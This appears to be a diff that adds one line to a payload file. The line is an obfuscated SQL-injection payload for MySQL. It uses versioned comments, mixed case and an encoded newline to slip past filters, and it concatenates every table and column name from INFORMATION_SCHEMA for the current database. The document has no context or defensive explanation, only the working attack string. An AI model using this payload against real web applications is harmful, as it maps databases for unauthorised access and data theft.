@@ -1,0 +1,1 @@
+(/*!12345SELECT*/(@)from(/*112345sELECT*/(@:=0x00), (/*! (/*!12345SELECT*/(@) from( InFORMATION_SCHEMA. ColUMNS)where(TAblE_SCHEMA =DatAbASE/ *data*/())and(@)in(@:=CoNCat% 0a(@,0x3c62723e5461626c6520466f756e64203a20, TaBLe_nAMe, 0x3a3a, column_name))))a)
